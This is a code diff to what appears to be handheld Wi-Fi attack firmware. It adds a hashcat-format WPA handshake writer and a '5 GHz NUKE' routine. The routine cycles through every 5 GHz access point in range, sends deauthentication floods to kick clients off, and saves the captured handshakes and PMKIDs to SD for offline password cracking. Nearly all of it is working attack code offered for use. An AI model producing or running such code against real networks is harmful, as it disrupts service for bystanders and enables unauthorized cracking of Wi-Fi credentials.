@@ -449,6 +449,31 @@ void feat_c5_scan_zb(void)
 
 /* ==================== C5 5 GHz PMKID capture ==================== */
 
+static void save_hs_to_sd(const c5_hs_t &h)
+{
+    if (!sd_mount()) return;
+    SD.mkdir("/poseidon");
+    File f = SD.open("/poseidon/hashcat.22000", FILE_APPEND);
+    if (!f) return;
+    /* hashcat 22000 WPA*02* format:
+     *   WPA*02*<mic>*<bssid>*<sta>*<essid_hex>*<anonce>*<m2_body>*02 */
+    f.print("WPA*02*");
+    for (int i = 0; i < 16; ++i) f.printf("%02x", h.mic[i]);
+    f.print("*");
+    for (int i = 0; i < 6;  ++i) f.printf("%02x", h.bssid[i]);
+    f.print("*");
+    for (int i = 0; i < 6;  ++i) f.printf("%02x", h.sta[i]);
+    f.print("*");
+    for (int i = 0; i < h.ssid_len && i < 33; ++i) f.printf("%02x", (uint8_t)h.ssid[i]);
+    f.print("*");
+    for (int i = 0; i < 32; ++i) f.printf("%02x", h.anonce[i]);
+    f.print("*");
+    int m2 = h.eapol_m2_len > 128 ? 128 : h.eapol_m2_len;
+    for (int i = 0; i < m2; ++i) f.printf("%02x", h.eapol_m2[i]);
+    f.println("*02");
+    f.close();
+}
+
 static void save_pmkid_to_sd(const c5_pmkid_t &p)
 {
     if (!sd_mount()) return;
@@ -595,5 +620,153 @@ void feat_c5_pmkid_5g(void)
         ui_toast(msg, T_GOOD, 1200);
     } else {
         ui_toast("no PMKID (try deauth first)", T_WARN, 1500);
+    }
+}
+
+/*
+ * feat_c5_nuke_5g — NUKE-ALL for the 5 GHz band via TRIDENT.
+ *
+ * Rotates through every 5 GHz AP the C5 has seen, firing:
+ *   (1) c5_cmd_hs(bssid, channel, 5000)   — promisc listen for M1/M2
+ *   (2) c5_cmd_deauth(bssid, channel, 0, 4000) — force re-auth storm
+ *
+ * The HS capture runs concurrently with the deauth on the C5 side —
+ * it's already listening when clients re-auth after getting kicked.
+ * Anything caught streams back as RESP_HS and gets written to
+ * /poseidon/hashcat.22000 in WPA*02* format. PMKIDs from the same
+ * target (if any) flush through the same loop.
+ *
+ * Runs until ESC. No time-slicing with the S3 side — this is the
+ * dedicated C5-only path.
+ */
+void feat_c5_nuke_5g(void)
+{
+    radio_switch(RADIO_WIFI);
+    c5_begin();
+    if (!c5_any_online()) { ui_toast("no C5 online", T_BAD, 1500); return; }
+
+    /* Initial scan to populate the 5G target list. */
+    c5_clear_results();
+    c5_cmd_scan_5g(800);
+    ui_toast("scanning 5 GHz...", T_ACCENT, 1200);
+    delay(1800);
+
+    c5_ap_t aps[64];
+    int n = c5_aps(aps, 64);
+    int five_n = 0;
+    for (int i = 0; i < n; ++i) if (aps[i].is_5g) aps[five_n++] = aps[i];
+    if (five_n == 0) { ui_toast("no 5 GHz APs found", T_WARN, 1500); return; }
+
+    auto &d = M5Cardputer.Display;
+    int cursor = 0;
+    uint32_t last = 0;
+    uint32_t last_rotate = 0;
+    int hs_written = 0;
+    int pmk_written = 0;
+    uint32_t last_rescan = millis();
+
+    ui_draw_footer("`=stop   deauth-all + HS capture loop");
+    while (true) {
+        uint32_t now = millis();
+
+        /* Rotate every 6 s so each C5 command has room to finish. */
+        if (now - last_rotate > 6000) {
+            last_rotate = now;
+            const c5_ap_t &t = aps[cursor % five_n];
+            c5_cmd_hs(t.bssid, t.channel, 5000);
+            c5_cmd_deauth(t.bssid, t.channel, 0, 4000);
+            cursor++;
+
+            /* Rescan every 45 s in case the target set moved. */
+            if (now - last_rescan > 45000) {
+                last_rescan = now;
+                c5_cmd_scan_5g(400);
+            }
+        }
+
+        /* Every 300 ms: refresh the target list (in case a scan just
+         * landed), drain any HS / PMKID captures into the hashcat log,
+         * paint the dashboard. */
+        if (now - last > 300) {
+            last = now;
+            int fresh_n = c5_aps(aps, 64);
+            int fresh_5 = 0;
+            for (int i = 0; i < fresh_n; ++i)
+                if (aps[i].is_5g) aps[fresh_5++] = aps[i];
+            if (fresh_5 > 0) five_n = fresh_5;
+
+            c5_hs_t hs[8];
+            int got_hs = c5_hss(hs, 8);
+            while (hs_written < got_hs) {
+                save_hs_to_sd(hs[hs_written]);
+                hs_written++;
+            }
+            c5_pmkid_t pm[8];
+            int got_pm = c5_pmkids(pm, 8);
+            while (pmk_written < got_pm) {
+                save_pmkid_to_sd(pm[pmk_written]);
+                pmk_written++;
+            }
+
+            /* Keep the NUKE splash aesthetic for this screen too. */
+            d.fillScreen(0x0000);
+            ui_glitch(0, 0, SCR_W, SCR_H);
+            for (int y = 0; y < SCR_H; y += 4)
+                d.drawFastHLine(0, y, SCR_W, 0x0020);
+
+            const char *headline = "5 GHz NUKE";
+            d.setTextSize(3);
+            int hw = d.textWidth(headline) * 3;
+            int hx = (SCR_W - hw) / 2;
+            int hy = 22;
+            d.setTextColor(0xF81F, 0);
+            d.setCursor(hx - 2, hy); d.print(headline);
+            d.setCursor(hx + 2, hy); d.print(headline);
+            d.setCursor(hx, hy - 2); d.print(headline);
+            d.setCursor(hx, hy + 2); d.print(headline);
+            d.setTextColor(0xFFFF, 0);
+            d.setCursor(hx, hy); d.print(headline);
+            d.setTextSize(1);
+
+            /* Green C5 indicator top-left. */
+            d.fillCircle(7, 6, 2, 0x07E0);
+            d.setTextColor(0x07E0, 0);
+            d.setCursor(13, 2); d.print("C5");
+
+            /* Target + stats. */
+            const c5_ap_t &t = aps[(cursor ? cursor - 1 : 0) % five_n];
+            d.setTextColor(0x07FF, 0);
+            d.setCursor(4, SCR_H - 44);
+            d.printf("-> %.20s", t.ssid[0] ? t.ssid : "<hidden>");
+            d.setTextColor(0x8410, 0);
+            d.setCursor(4, SCR_H - 34);
+            d.printf("ch%u %02X:%02X:%02X:%02X:%02X:%02X",
+                     t.channel, t.bssid[0], t.bssid[1], t.bssid[2],
+                     t.bssid[3], t.bssid[4], t.bssid[5]);
+
+            char row1[48], row2[48];
+            snprintf(row1, sizeof(row1), "%d APs  HS:%d  PMKID:%d",
+                     five_n, hs_written, pmk_written);
+            snprintf(row2, sizeof(row2), "rotation %d", cursor);
+            d.setTextColor(hs_written > 0 ? 0x07E0 : 0xFFE0, 0);
+            int w1 = d.textWidth(row1);
+            d.setCursor((SCR_W - w1) / 2, SCR_H - 22);
+            d.print(row1);
+            d.setTextColor(0xFFFF, 0);
+            int w2 = d.textWidth(row2);
+            d.setCursor((SCR_W - w2) / 2, SCR_H - 10);
+            d.print(row2);
+        }
+
+        uint16_t k = input_poll();
+        if (k == PK_NONE) { delay(20); continue; }
+        if (k == PK_ESC) break;
+    }
+    c5_cmd_stop();
+    if (hs_written > 0 || pmk_written > 0) {
+        char msg[48];
+        snprintf(msg, sizeof(msg), "saved %d HS, %d PMKID",
+                 hs_written, pmk_written);
+        ui_toast(msg, T_GOOD, 1500);
     }
 }
